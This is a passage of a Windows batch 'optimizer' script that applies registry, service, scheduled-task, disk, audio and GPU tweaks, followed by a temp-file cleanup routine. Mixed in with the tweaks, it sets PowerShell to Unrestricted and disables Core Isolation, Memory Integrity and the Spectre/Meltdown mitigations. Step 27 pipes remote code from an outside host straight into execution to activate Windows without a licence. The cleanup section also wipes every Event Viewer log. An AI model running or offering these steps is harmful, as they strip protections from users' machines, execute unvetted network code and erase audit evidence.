REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\OneSyncSvc" /v "Start" /t REG_DWORD /d 4 /f >nul 2>&1 || set STEP_ERR=1
:: Background Apps
REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\BackgroundAccessApplications" /v "GlobalUserDisabled" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Search" /v "BackgroundAppGlobalToggle" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
:: P2P / Peernet
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Peernet" /v "Disabled" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
if !STEP_ERR!==0 (
    echo  [OK] Additional Privacy and Service Tweaks
    set /a PASS+=1
) else (
    echo  [FAIL] Additional Privacy and Service Tweaks
    set /a FAIL+=1
    echo Additional Privacy and Service Tweaks>> "!_FAILS!"
)

:: ================================================
:: STEP 17 - Custom Visual Effects
:: ================================================
echo [STEP 17/27] Applying Custom Visual Effects...
set STEP_ERR=0
:: Disable transparency
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Themes\Personalize" /v "EnableTransparency" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
:: Use Custom visual effects mode
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects" /v "VisualFXSetting" /t REG_DWORD /d 3 /f >nul 2>&1 || set STEP_ERR=1
:: Show window contents while dragging
reg add "HKCU\Control Panel\Desktop" /v "DragFullWindows" /t REG_SZ /d 1 /f >nul 2>&1 || set STEP_ERR=1
:: Smooth edges of screen fonts
reg add "HKCU\Control Panel\Desktop" /v "FontSmoothing" /t REG_SZ /d 2 /f >nul 2>&1 || set STEP_ERR=1
:: Enable translucent selection rectangle
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "ListviewAlphaSelect" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
:: Show thumbnails instead of icons
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "IconsOnly" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
:: Disable taskbar animations
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "TaskbarAnimations" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
:: Disable menu show delay
reg add "HKCU\Control Panel\Desktop" /v "MenuShowDelay" /t REG_SZ /d 0 /f >nul 2>&1 || set STEP_ERR=1
:: Disable window minimize/maximize animations
reg add "HKCU\Control Panel\Desktop\WindowMetrics" /v "MinAnimate" /t REG_SZ /d 0 /f >nul 2>&1 || set STEP_ERR=1
:: Disable mouse shadow
reg add "HKCU\Control Panel\Desktop" /v "UserPreferencesMask" /t REG_BINARY /d 9012038010000000 /f >nul 2>&1 || set STEP_ERR=1
:: Disable enhance pointer precision (mouse acceleration)
reg add "HKCU\Control Panel\Mouse" /v "MouseSpeed" /t REG_SZ /d "0" /f >nul 2>&1 || set STEP_ERR=1
reg add "HKCU\Control Panel\Mouse" /v "MouseThreshold1" /t REG_SZ /d "0" /f >nul 2>&1 || set STEP_ERR=1
reg add "HKCU\Control Panel\Mouse" /v "MouseThreshold2" /t REG_SZ /d "0" /f >nul 2>&1 || set STEP_ERR=1
:: Restart Explorer to apply visual changes
echo  Restarting Explorer to apply visual changes...
taskkill /f /im explorer.exe >nul 2>&1
start explorer.exe
if !STEP_ERR!==0 (
    echo  [OK] Custom Visual Effects
    set /a PASS+=1
) else (
    echo  [FAIL] Custom Visual Effects
    set /a FAIL+=1
    echo Custom Visual Effects>> "!_FAILS!"
)


:: ================================================
:: STEP 18 - PowerShell Execution Policy
:: ================================================
echo [STEP 18/27] Setting PowerShell Execution Policy...
set STEP_ERR=0
powershell -Command "Set-ExecutionPolicy Unrestricted -Scope LocalMachine -Force" >nul 2>&1 || set STEP_ERR=1
reg add "HKLM\SOFTWARE\Microsoft\PowerShell\1\ShellIds\Microsoft.PowerShell" /v "ExecutionPolicy" /t REG_SZ /d "Unrestricted" /f >nul 2>&1 || set STEP_ERR=1
if !STEP_ERR!==0 (
    echo  [OK] PowerShell Execution Policy
    set /a PASS+=1
) else (
    echo  [FAIL] PowerShell Execution Policy
    set /a FAIL+=1
    echo PowerShell Execution Policy>> "!_FAILS!"
)

:: ================================================
:: STEP 19 - Core Isolation and Memory Integrity
:: ================================================
echo [STEP 19/27] Disabling Core Isolation and Memory Integrity...
set STEP_ERR=0
reg add "HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity" /v "Enabled" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
reg add "HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard" /v "EnableVirtualizationBasedSecurity" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
reg add "HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard" /v "RequirePlatformSecurityFeatures" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
bcdedit /set hypervisorlaunchtype off >nul 2>&1 || set STEP_ERR=1
if !STEP_ERR!==0 (
    echo  [OK] Core Isolation and Memory Integrity
    set /a PASS+=1
) else (
    echo  [FAIL] Core Isolation and Memory Integrity
    set /a FAIL+=1
    echo Core Isolation and Memory Integrity>> "!_FAILS!"
)

:: ================================================
:: STEP 20 - Spectre and Meltdown Mitigations
:: ================================================
echo [STEP 20/27] Disabling Spectre and Meltdown Mitigations...
set STEP_ERR=0
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "FeatureSettingsOverride" /t REG_DWORD /d 3 /f >nul 2>&1 || set STEP_ERR=1
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "FeatureSettingsOverrideMask" /t REG_DWORD /d 3 /f >nul 2>&1 || set STEP_ERR=1
if !STEP_ERR!==0 (
    echo  [OK] Spectre and Meltdown Mitigations
    set /a PASS+=1
) else (
    echo  [FAIL] Spectre and Meltdown Mitigations
    set /a FAIL+=1
    echo Spectre and Meltdown Mitigations>> "!_FAILS!"
)

:: ================================================
:: STEP 21 - Disable Unnecessary Services
:: ================================================
echo [STEP 21/27] Disabling Unnecessary Services...
set STEP_ERR=0
:: Background Intelligent Transfer Service
sc config BITS start= disabled >nul 2>&1 & sc stop BITS >nul 2>&1
:: Connected User Experiences and Telemetry
sc config DiagTrack start= disabled >nul 2>&1 & sc stop DiagTrack >nul 2>&1
:: Data Usage
sc config DusmSvc start= disabled >nul 2>&1 & sc stop DusmSvc >nul 2>&1
:: Diagnostic Policy Service
sc config DPS start= disabled >nul 2>&1 & sc stop DPS >nul 2>&1
:: Distributed Link Tracking Client
sc config TrkWks start= disabled >nul 2>&1 & sc stop TrkWks >nul 2>&1
:: Downloaded Maps Manager
sc config MapsBroker start= disabled >nul 2>&1 & sc stop MapsBroker >nul 2>&1
:: Game Bar and DVR
sc config BcastDVRUserService start= disabled >nul 2>&1 & sc stop BcastDVRUserService >nul 2>&1
:: Geolocation Service
sc config lfsvc start= disabled >nul 2>&1 & sc stop lfsvc >nul 2>&1
:: Hyper-V related services
for %%H in (HvHost vmickvpexchange vmicguestinterface vmicshutdown vmictimesync vmicvmsession vmicrdv vmicvss vmicheartbeat) do (
    sc config %%H start= disabled >nul 2>&1
    sc stop %%H >nul 2>&1
)
:: IP Helper
sc config iphlpsvc start= disabled >nul 2>&1 & sc stop iphlpsvc >nul 2>&1
:: Parental Controls
sc config WpcMonSvc start= disabled >nul 2>&1 & sc stop WpcMonSvc >nul 2>&1
:: Print Spooler
sc config Spooler start= disabled >nul 2>&1 & sc stop Spooler >nul 2>&1
:: Quality Windows Audio Video Experience
sc config QWAVE start= disabled >nul 2>&1 & sc stop QWAVE >nul 2>&1
:: Remote Registry
sc config RemoteRegistry start= disabled >nul 2>&1 & sc stop RemoteRegistry >nul 2>&1
:: Retail Demo Service
sc config RetailDemo start= disabled >nul 2>&1 & sc stop RetailDemo >nul 2>&1
:: Sync Host / OneDrive Sync
sc config OneSyncSvc start= disabled >nul 2>&1 & sc stop OneSyncSvc >nul 2>&1
:: Sysmain
sc config SysMain start= disabled >nul 2>&1 & sc stop SysMain >nul 2>&1
:: TCP/IP NetBIOS Helper
sc config lmhosts start= disabled >nul 2>&1 & sc stop lmhosts >nul 2>&1
:: Telephony
sc config TapiSrv start= disabled >nul 2>&1 & sc stop TapiSrv >nul 2>&1
:: Themes
sc config Themes start= disabled >nul 2>&1 & sc stop Themes >nul 2>&1
:: Windows Search
sc config WSearch start= disabled >nul 2>&1 & sc stop WSearch >nul 2>&1
sc config GameInputSvc start= disabled >nul 2>&1 & sc stop GameInputSvc >nul 2>&1
:: Windows Error Reporting
sc config WerSvc start= disabled >nul 2>&1 & sc stop WerSvc >nul 2>&1
:: Fax
sc config Fax start= disabled >nul 2>&1 & sc stop Fax >nul 2>&1
:: WAP Push / Device Management
sc config dmwappushservice start= disabled >nul 2>&1 & sc stop dmwappushservice >nul 2>&1
:: Secondary Logon
sc config seclogon start= disabled >nul 2>&1 & sc stop seclogon >nul 2>&1
:: Touch Keyboard and Handwriting Panel
sc config TabletInputService start= disabled >nul 2>&1 & sc stop TabletInputService >nul 2>&1
:: Mixed Reality OpenXR
sc config MixedRealityOpenXRSvc start= disabled >nul 2>&1 & sc stop MixedRealityOpenXRSvc >nul 2>&1
:: Smart Card
sc config SCardSvr start= disabled >nul 2>&1 & sc stop SCardSvr >nul 2>&1
sc config ScDeviceEnum start= disabled >nul 2>&1 & sc stop ScDeviceEnum >nul 2>&1
if !STEP_ERR!==0 (
    echo  [OK] Disable Unnecessary Services
    set /a PASS+=1
) else (
    echo  [FAIL] Disable Unnecessary Services
    set /a FAIL+=1
    echo Disable Unnecessary Services>> "!_FAILS!"
)


:: ================================================
:: STEP 22 - Scheduled Tasks Cleanup
:: ================================================
echo [STEP 22/27] Disabling Telemetry and Bloat Scheduled Tasks...
set STEP_ERR=0
for %%T in (
    "Microsoft\Windows\Application Experience\Microsoft Compatibility Appraiser"
    "Microsoft\Windows\Application Experience\ProgramDataUpdater"
    "Microsoft\Windows\Application Experience\StartupAppTask"
    "Microsoft\Windows\Autochk\Proxy"
    "Microsoft\Windows\Customer Experience Improvement Program\Consolidator"
    "Microsoft\Windows\Customer Experience Improvement Program\KernelCeipTask"
    "Microsoft\Windows\Customer Experience Improvement Program\UsbCeip"
    "Microsoft\Windows\Defrag\ScheduledDefrag"
    "Microsoft\Windows\Device Information\Device"
    "Microsoft\Windows\Diagnosis\Scheduled"
    "Microsoft\Windows\DiskDiagnostic\Microsoft-Windows-DiskDiagnosticDataCollector"
    "Microsoft\Windows\DiskDiagnostic\Microsoft-Windows-DiskDiagnosticResolver"
    "Microsoft\Windows\DiskFootprint\Diagnostics"
    "Microsoft\Windows\Feedback\Siuf\DmClient"
    "Microsoft\Windows\Feedback\Siuf\DmClientOnScenarioDownload"
    "Microsoft\Windows\Input\LocalUserSyncDataAvailable"
    "Microsoft\Windows\Input\MouseSyncDataAvailable"
    "Microsoft\Windows\Input\PenSyncDataAvailable"
    "Microsoft\Windows\Input\TouchpadSyncDataAvailable"
    "Microsoft\Windows\Location\Notifications"
    "Microsoft\Windows\Location\WindowsActionDialog"
    "Microsoft\Windows\Maintenance\WinSAT"
    "Microsoft\Windows\Maps\MapsToastTask"
    "Microsoft\Windows\Maps\MapsUpdateTask"
    "Microsoft\Windows\NetTrace\GatherNetworkInfo"
    "Microsoft\Windows\PI\Sqm-Tasks"
    "Microsoft\Windows\Power Efficiency Diagnostics\AnalyzeSystem"
    "Microsoft\Windows\Shell\FamilySafetyMonitor"
    "Microsoft\Windows\Shell\FamilySafetyRefreshTask"
    "Microsoft\Windows\Speech\SpeechModelDownloadTask"
    "Microsoft\Windows\UpdateOrchestrator\Schedule Scan"
    "Microsoft\Windows\WDI\ResolutionHost"
    "Microsoft\Windows\Windows Error Reporting\QueueReporting"
    "Microsoft\Windows\WindowsUpdate\Automatic App Update"
    "Microsoft\Windows\WindowsUpdate\Scheduled Start"
    "Microsoft\XblGameSave\XblGameSaveTask"
) do (
    schtasks /change /tn %%T /disable >nul 2>&1
)
:: Disable automatic maintenance
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\Maintenance" /v "MaintenanceDisabled" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
if !STEP_ERR!==0 (
    echo  [OK] Scheduled Tasks Cleanup
    set /a PASS+=1
) else (
    echo  [FAIL] Scheduled Tasks Cleanup
    set /a FAIL+=1
    echo Scheduled Tasks Cleanup>> "!_FAILS!"
)

:: ================================================
:: STEP 23 - Disk and File System Tweaks
:: ================================================
echo [STEP 23/27] Applying Disk and File System Tweaks...
set STEP_ERR=0
:: Disable NTFS last access timestamp (reduces I/O on every file read/write)
fsutil behavior set disablelastaccess 1 >nul 2>&1 || set STEP_ERR=1
:: Disable 8.3 filename creation (reduces NTFS overhead on large directories)
fsutil behavior set disable8dot3 1 >nul 2>&1 || set STEP_ERR=1
:: Disable memory-mapped I/O for NTFS (reduces paging)
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\FileSystem" /v "NtfsMemoryUsage" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
:: Disable Storage Sense (stops Windows from auto-deleting files in the background)
REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\StorageSense\Parameters\StoragePolicy" /v "01" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKCU\SOFTWARE\Policies\Microsoft\Windows\StorageSense" /v "AllowStorageSenseGlobal" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
:: Disable hibernation completely and remove hiberfil.sys (frees RAM-sized disk space)
powercfg /h off >nul 2>&1 || set STEP_ERR=1
:: Pagefile: detect RAM and set fixed size (no dynamic resize overhead during gaming)
:: <8GB RAM = 8192MB  |  8-16GB = 4096MB  |  >16GB = 2048MB
powershell -NoProfile -Command "$r=[math]::Round((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory/1GB);$p=if($r-lt 8){8192}elseif($r-le 16){4096}else{2048};$c=Get-WmiObject Win32_ComputerSystem -EnableAllPrivileges;$c.AutomaticManagedPagefile=$false;$c.Put()|Out-Null;$pfs=Get-WmiObject Win32_PageFileSetting;if($pfs){$pfs|%%{$_.InitialSize=$p;$_.MaximumSize=$p;$_.Put()|Out-Null}}else{Set-WmiInstance -Class Win32_PageFileSetting -Arguments @{Name='C:\pagefile.sys';InitialSize=$p;MaximumSize=$p}|Out-Null}" >nul 2>&1 || set STEP_ERR=1
if !STEP_ERR!==0 (
    echo  [OK] Disk and File System Tweaks
    set /a PASS+=1
) else (
    echo  [FAIL] Disk and File System Tweaks
    set /a FAIL+=1
    echo Disk and File System Tweaks>> "!_FAILS!"
)

:: ================================================
:: STEP 24 - UI and Taskbar Cleanup
:: ================================================
echo [STEP 24/27] Applying UI and Taskbar Cleanup...
set STEP_ERR=0
:: Disable Widgets / News and Interests on taskbar
REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "TaskbarDa" /t REG_DWORD /d 0 /f >nul 2>&1
:: Disable Chat / Teams icon on taskbar
REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "TaskbarMn" /t REG_DWORD /d 0 /f >nul 2>&1
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows\Windows Chat" /v "ChatIcon" /t REG_DWORD /d 3 /f >nul 2>&1
:: Disable Start Menu recommendations and suggested content
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows\Explorer" /v "HideRecommendedSection" /t REG_DWORD /d 1 /f >nul 2>&1
REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "Start_TrackProgs" /t REG_DWORD /d 0 /f >nul 2>&1
:: Disable lock screen ads and Spotlight
REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "SubscribedContent-338388Enabled" /t REG_DWORD /d 0 /f >nul 2>&1
REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "SubscribedContent-338389Enabled" /t REG_DWORD /d 0 /f >nul 2>&1
REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "SubscribedContent-353694Enabled" /t REG_DWORD /d 0 /f >nul 2>&1
REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "SubscribedContent-353696Enabled" /t REG_DWORD /d 0 /f >nul 2>&1
REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "RotatingLockScreenEnabled" /t REG_DWORD /d 0 /f >nul 2>&1
REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "RotatingLockScreenOverlayEnabled" /t REG_DWORD /d 0 /f >nul 2>&1
REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "SoftLandingEnabled" /t REG_DWORD /d 0 /f >nul 2>&1
REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "SystemPaneSuggestionsEnabled" /t REG_DWORD /d 0 /f >nul 2>&1
:: Remove OneDrive from File Explorer sidebar
REG ADD "HKCU\Software\Classes\CLSID\{018D5C66-4533-4307-9B53-224DE2ED1FE6}" /v "System.IsPinnedToNameSpaceTree" /t REG_DWORD /d 0 /f >nul 2>&1
:: Disable Sticky Keys / Toggle Keys / Filter Keys shortcut (no more Shift x5 popup in games)
REG ADD "HKCU\Control Panel\Accessibility\StickyKeys" /v "Flags" /t REG_SZ /d "506" /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKCU\Control Panel\Accessibility\ToggleKeys" /v "Flags" /t REG_SZ /d "58" /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKCU\Control Panel\Accessibility\Keyboard Response" /v "Flags" /t REG_SZ /d "122" /f >nul 2>&1 || set STEP_ERR=1
:: Disable "Get the most out of Windows" and welcome experience suggestions
REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\UserProfileEngagement" /v "ScoobeSystemSettingEnabled" /t REG_DWORD /d 0 /f >nul 2>&1
:: Disable Bing search in Start Menu
REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Search" /v "BingSearchEnabled" /t REG_DWORD /d 0 /f >nul 2>&1
REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Search" /v "CortanaConsent" /t REG_DWORD /d 0 /f >nul 2>&1
if !STEP_ERR!==0 (
    echo  [OK] UI and Taskbar Cleanup
    set /a PASS+=1
) else (
    echo  [FAIL] UI and Taskbar Cleanup
    set /a FAIL+=1
    echo UI and Taskbar Cleanup>> "!_FAILS!"
)

:: ================================================
:: STEP 25 - Audio Tweaks
:: ================================================
echo [STEP 25/27] Applying Audio Tweaks...
set STEP_ERR=0
:: Disable audio enhancements on all render devices
powershell -NoProfile -Command "Get-ChildItem 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\MMDevices\Audio\Render' -ErrorAction SilentlyContinue | ForEach-Object { $p=Join-Path $_.PSPath 'Properties'; if(Test-Path $p){ try{ New-ItemProperty -Path $p -Name '{1da5d803-d492-4edd-8c23-e0c0ffee7f0e},5' -Value 1 -PropertyType DWord -Force -EA SilentlyContinue|Out-Null }catch{} } }" >nul 2>&1 || set STEP_ERR=1
:: MMCSS audio task priorities (lower audio scheduling latency)
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile" /v "NoLazyMode" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile" /v "AlwaysOn" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Audio" /v "Affinity" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Audio" /v "Background Only" /t REG_SZ /d "False" /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Audio" /v "Clock Rate" /t REG_DWORD /d 10000 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Audio" /v "GPU Priority" /t REG_DWORD /d 8 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Audio" /v "Priority" /t REG_DWORD /d 6 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Audio" /v "Scheduling Category" /t REG_SZ /d "Medium" /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Audio" /v "SFIO Priority" /t REG_SZ /d "Normal" /f >nul 2>&1 || set STEP_ERR=1
if !STEP_ERR!==0 (
    echo  [OK] Audio Tweaks
    set /a PASS+=1
) else (
    echo  [FAIL] Audio Tweaks
    set /a FAIL+=1
    echo Audio Tweaks>> "!_FAILS!"
)

:: ================================================
:: STEP 26 - NVIDIA and AMD GPU Cleanup
:: ================================================
echo [STEP 26/27] Applying NVIDIA and AMD GPU Cleanup...
set STEP_ERR=0
:: Disable NVIDIA telemetry service
sc config NvTelemetryContainer start= disabled >nul 2>&1 & sc stop NvTelemetryContainer >nul 2>&1
:: Disable NVIDIA ULPS (Ultra Low Power State) - prevents GPU from idling between frames
powershell -NoProfile -Command "Get-ChildItem 'HKLM:\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}' -ErrorAction SilentlyContinue | Where-Object {$_.Name -match '\\\d{4}$'} | ForEach-Object { Set-ItemProperty -Path $_.PSPath -Name 'EnableUlps' -Value 0 -Type DWord -Force -EA SilentlyContinue; Set-ItemProperty -Path $_.PSPath -Name 'EnableUlps_NA' -Value 0 -Type DWord -Force -EA SilentlyContinue }" >nul 2>&1
:: Disable AMD Crash Defender and telemetry (no-op on NVIDIA systems)
sc config "AMD Crash Defender" start= disabled >nul 2>&1 & sc stop "AMD Crash Defender" >nul 2>&1
sc config "AMD External Events Utility" start= disabled >nul 2>&1 & sc stop "AMD External Events Utility" >nul 2>&1
if !STEP_ERR!==0 (
    echo  [OK] NVIDIA and AMD GPU Cleanup
    set /a PASS+=1
) else (
    echo  [FAIL] NVIDIA and AMD GPU Cleanup
    set /a FAIL+=1
    echo NVIDIA and AMD GPU Cleanup>> "!_FAILS!"
)

:: ================================================
:: STEP 27 - Windows Activation
:: ================================================
echo [STEP 27/27] Running Windows Activation Script...
echo  Launching MAS activation tool - follow the prompts...
echo.
powershell -NoProfile -ExecutionPolicy Bypass -Command "irm https://get.activated.win | iex"
echo.
echo  [OK] Windows Activation script executed
set /a PASS+=1

:: Re-enable Defender
echo.
echo Re-enabling Windows Defender...
:: Remove the hosts folder exclusion we added at the start
powershell -NoProfile -Command "Remove-MpPreference -ExclusionPath '$env:SystemRoot\System32\drivers\etc' -ErrorAction SilentlyContinue" >nul 2>&1
:: Remove the policy registry keys we set (they take priority over UI settings when present)
REG DELETE "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /f >nul 2>&1
REG DELETE "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiVirus" /f >nul 2>&1
REG DELETE "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableBehaviorMonitoring" /f >nul 2>&1
REG DELETE "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableOnAccessProtection" /f >nul 2>&1
REG DELETE "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring" /f >nul 2>&1
REG DELETE "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableScanOnRealtimeEnable" /f >nul 2>&1
REG DELETE "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v "DisableBlockAtFirstSeen" /f >nul 2>&1
:: Restore Defender services to automatic and restart them
sc config WinDefend start= auto >nul 2>&1
sc config WdNisSvc start= auto >nul 2>&1
net start WinDefend >nul 2>&1
net start WdNisSvc >nul 2>&1
:: Re-enable all Defender features (Core Isolation stays OFF - controlled by Step 19 registry keys)
powershell -NoProfile -Command "Set-MpPreference -DisableRealtimeMonitoring $false -DisableBehaviorMonitoring $false -DisableBlockAtFirstSeen $false -DisableIOAVProtection $false -DisablePrivacyMode $false -DisableScriptScanning $false -EnableNetworkProtection Enabled -EnableControlledFolderAccess Enabled -MAPSReporting Advanced -SubmitSamplesConsent SendSafeSamples -PUAProtection Enabled -ErrorAction SilentlyContinue" >nul 2>&1
echo  [OK] Defender re-enabled
echo.

:: ================================================
:: RESULTS SUMMARY
:: ================================================
echo.
echo ================================================
echo        ALL OPTIMIZATIONS COMPLETE!
echo ================================================
echo.
echo  Steps completed:  !PASS!/27
echo  Steps failed:     !FAIL!/27
echo.

if !FAIL! GTR 0 (
    color 0E
    echo  -- The following steps reported errors:
    echo.
    if exist "!_FAILS!" type "!_FAILS!"
    echo.
    echo  Note: Some errors may be harmless ^(e.g. a key already exists,
    echo  a setting is unsupported on this Windows version, or an ETS
    echo  session was not active^).
    echo.
) else (
    echo  All steps completed successfully!
    echo.
)

echo  [1]  Visual performance tweaks
echo  [2]  App/service timeout tweaks
echo  [3]  Registry tweaks (Live Tiles, Ink, DPC/ISR)
echo  [4]  CPU power tweaks
echo  [5]  Display tweaks
echo  [6]  GPU tweaks
echo  [7]  Network + TCP/IP + AFD tweaks
echo  [8]  System + USB tweaks
echo  [9]  Boot + CPU scheduler tweaks
echo  [10] RDP disabled
echo  [11] Security (SSL/TLS, NTLM, SMB1, NetBIOS)
echo  [12] Microsoft telemetry blocked via HOSTS file + DNS NRPT + DiagTrack firewall rule
echo  [13] Core.pow power plan imported and activated
echo  [14] Event Trace Sessions (ETS) disabled
echo  [15] Privacy and bloat tweaks (location, Edge, Copilot, telemetry, Game DVR, etc.)
echo  [16] Additional privacy tweaks (search, speech, OneDrive sync, background apps, CEIP)
echo  [17] Custom visual effects (transparency off, thumbnails, font smoothing, no animations)
echo  [18] PowerShell execution policy set to Unrestricted
echo  [19] Core Isolation and Memory Integrity disabled
echo  [20] Spectre and Meltdown mitigations disabled
echo  [21] Unnecessary services disabled
echo  [22] Scheduled tasks cleanup (telemetry, diagnostics, CEIP, maintenance)
echo  [23] Disk tweaks (NTFS last-access off, 8.3 names off, hibernation off, fixed pagefile)
echo  [24] UI and taskbar cleanup (widgets, chat, Start suggestions, lock screen ads, Sticky Keys)
echo  [25] Audio tweaks (enhancements off, MMCSS priority tuning)
echo  [26] NVIDIA/AMD cleanup (ULPS disabled, telemetry services stopped)
echo  [27] Windows Activation script executed
echo.
echo  A RESTART IS REQUIRED for all changes to take effect!
echo.
set /p RESTART="Restart now? (Y/N): "
if /i "%RESTART%"=="Y" shutdown /r /t 5 /c "Restarting to apply optimizations..."
echo.
pause
if exist "!_FAILS!" del "!_FAILS!" >nul 2>&1
goto :RETURN_MENU

:: ====================================================
::  OPTION 2 - CLEAN TEMP FILES
:: ====================================================
:OPT2
cls
color 0A
echo.
echo  =====================================================
echo         Win Light Optimizer  -  Cleanup Tool
echo  =====================================================
echo.

:: Get disk free space BEFORE cleanup (drive C)
for /f "tokens=3" %%a in ('dir c:\ /-c ^| find "bytes free"') do set BEFORE=%%a

echo  [1/10] Cleaning Windows Temp folder...
del /s /f /q %SystemRoot%\Temp\*.* >nul 2>&1
rd /s /q %SystemRoot%\Temp >nul 2>&1
md %SystemRoot%\Temp >nul 2>&1

echo  [2/10] Cleaning User Temp folder...
del /s /f /q %TEMP%\*.* >nul 2>&1

echo  [3/10] Cleaning Prefetch...
del /s /f /q %SystemRoot%\Prefetch\*.* >nul 2>&1

echo  [4/10] Cleaning Windows Update Cache...
net stop wuauserv >nul 2>&1
net stop bits >nul 2>&1
del /s /f /q %SystemRoot%\SoftwareDistribution\Download\*.* >nul 2>&1
net start wuauserv >nul 2>&1
net start bits >nul 2>&1

echo  [5/10] Cleaning Log Files...
del /s /f /q %SystemRoot%\Logs\*.log >nul 2>&1
del /s /f /q %SystemRoot%\inf\*.log >nul 2>&1
del /s /f /q %SystemRoot%\system32\LogFiles\*.* >nul 2>&1
del /s /f /q %SystemRoot%\Panther\*.log >nul 2>&1
del /s /f /q %SystemRoot%\debug\*.log >nul 2>&1

echo  [6/10] Clearing Windows Event Viewer Logs...
for /F "tokens=*" %%G in ('wevtutil.exe el') do (
    wevtutil.exe cl "%%G" >nul 2>&1
)

echo  [7/10] Flushing DNS Cache...
ipconfig /flushdns >nul 2>&1

echo  [8/10] Resetting Winsock...
netsh winsock reset >nul 2>&1

echo  [9/10] Cleaning Recycle Bin...
rd /s /q C:\$Recycle.Bin >nul 2>&1

echo  [10/10] Running Disk Cleanup (silent)...
